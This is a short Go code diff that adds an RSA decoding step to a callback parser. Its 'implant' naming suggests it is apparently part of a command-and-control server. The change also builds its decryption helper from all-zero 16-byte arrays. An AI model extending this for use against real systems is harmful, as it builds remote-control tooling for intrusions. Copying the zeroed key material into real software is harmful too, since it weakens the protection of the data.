@@ -20,7 +20,14 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 	if name == "" {
 		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
 		n, _ := base64.StdEncoding.Decode(dataB64, d)
-		r = bytes.NewReader(dataB64[:n])
+
+		aux := encrypt.EncryptImport([16]byte{}, [16]byte{})
+		a, err := aux.RSADecode(dataB64[:n])
+		if err != nil {
+			return internal.NIL, []byte{}
+		}
+		
+		r = bytes.NewReader(a)
 	} else {
 		imp := ImplantPtrByName(name)
 		if imp == nil {
